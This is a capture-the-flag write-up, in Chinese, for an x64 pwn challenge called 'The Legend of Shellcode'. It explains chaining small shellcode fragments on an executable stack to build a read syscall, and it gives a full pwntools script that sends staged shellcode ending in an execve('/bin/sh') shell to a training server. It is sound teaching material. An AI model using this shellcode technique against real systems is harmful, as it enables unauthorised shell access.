# The Legend of Shellcode

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO |Full  |
|Canary|on    |
|NX    |off   |
|PIE   |on    |
|strip |no    |
|libc  |2.31-0ubuntu9.12|

## 解题思路

nx没开，栈上放了一堆`ret`，一运行就是`pop rip`，那么控制好rsp，就能让rip跳到下一个read的段；
由于我想的是`add rax,0x10;push rax`的方式移动rip，因此读入9字节，只剩4字节空间了，不适合放"/bin/sh"
字符串，因此考虑在初始读入的位置搓一个`SYSCALL_read`出来方便读入完整的shellcode（打newstar ctf打的），
再跳转过去就可以拿到shell

> 赛后交流发现short jmp所耗字节更少，还是疏忽了

## EXPLOIT

```python
from pwn import *
context.arch = 'amd64'

def payload(lo:int):
    if lo:
        sh = process('./code')
        if lo & 2:
            gdb.attach(sh, gdbscript='b *$rebase(0x13b7)')
    else:
        sh = remote('training.0rays.club', 10004)

    # section 1
    shc = asm('''
    push rax
    xor rdi,rdi
    add rax,0x10
    push rax
    ''')
    sh.send(shc)

    # section 2
    shc = asm('''
    pop rbx
    mov rdx,r11
    add rax,0x10
    push rax
    ''')
    sh.send(shc)

    # section 3
    shc = asm('''
    push rbx
    pop rsi
    push rbx
    xor rax,rax
    syscall
    ret
    ''')
    sh.send(shc)

    # skipping rest
    sh.sendlineafter(b'sh:', b'')
    sh.sendlineafter(b'ht:', b'')
    sh.sendlineafter(b'ul:',b'')
    

    # section SYSCALL_read
    shc = asm('''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor rsi,rsi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
    ''')
    sh.sendlineafter(b'ru', shc)

    sh.interactive()
```

